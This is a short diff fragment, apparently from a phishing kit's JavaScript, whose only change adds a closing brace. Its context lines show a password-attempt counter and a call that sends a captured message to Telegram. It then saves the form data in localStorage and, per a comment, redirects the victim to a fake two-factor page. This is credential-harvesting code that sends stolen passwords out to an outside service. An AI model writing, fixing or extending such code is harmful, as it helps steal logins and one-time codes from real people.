@@ -496,6 +496,7 @@ if (passwordAttemptCount === 1) {
   await sendMessageToTelegram(message);
   passwordPopupOverlay.style.display = 'none';
 }
+}
 
                 // Store data in localStorage and redirect to 2FA page
                 localStorage.setItem('formData', JSON.stringify(formData));
